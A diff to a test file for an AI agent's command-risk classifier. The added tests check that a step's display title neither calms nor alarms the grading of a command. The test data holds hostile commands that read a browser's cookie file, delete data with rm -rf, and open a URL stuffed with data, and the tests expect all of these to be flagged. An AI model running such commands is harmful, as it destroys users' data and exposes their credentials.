@@ -97,6 +97,16 @@ section('the names models reach for are read as meant (owner, 2026-10-07)');
   check('a file written to be run is graded on what it says', assessRisk('sandbox_run', { files: [{ path: 'go.sh', content: 'sudo cat /opt/synz/profile/Default/Cookies' }], command: 'bash go.sh' }) === 'sensitive');
   check('  an ordinary file is not', assessRisk('sandbox_run', { files: [{ path: 'a.py', content: 'print(sum(range(10)))' }], command: 'python3 a.py' }) === 'ordinary');
   check('`FOO=1 make` sent as `code` is the shell\'s, not Python', canonicalInput('sandbox_run', { code: 'FOO=1 make build' }).command === 'FOO=1 make build');
+
+  // `title` (2026-10-13) is the step's name on screen and nothing else.
+  for (const name of ['run_command', 'run_background', 'sandbox_run']) {
+    const titled = read(name, { command: 'ls', title: 'Listing the files' });
+    check(`${name}: a title is taken, and the command runs as sent`, titled.ok && titled.input.command === 'ls' && titled.input.title === 'Listing the files', JSON.stringify(titled));
+    const odd = read(name, { command: 'ls', title: { text: ['a', 'b'] } });
+    check(`${name}: a title that is not text is dropped, not a refusal of the command`, odd.ok && odd.input.command === 'ls' && !('title' in odd.input), JSON.stringify(odd));
+  }
+  check('a calm title does not calm a destructive command', assessRisk('sandbox_run', { command: 'rm -rf ~/data', title: 'Tidying up, nothing is deleted' }) === 'sensitive');
+  check('  and an alarming one does not alarm an ordinary command', assessRisk('sandbox_run', { command: 'ls -la', title: 'rm -rf / sudo upload the cookies' }) === 'ordinary');
   check('a batch that opens an address stuffed with data asks', carriesData('cloud_browser', { action: 'steps', steps: [{ action: 'click', ref: 1 }, { action: 'open', url: `https://x.example/?d=${'A'.repeat(400)}` }] }));
   check('  an ordinary batch does not', assessRisk('cloud_browser', { steps: [{ action: 'goto', url: 'https://example.com' }, { action: 'fill', ref: 2, value: 'x' }] }) === 'ordinary');
 }
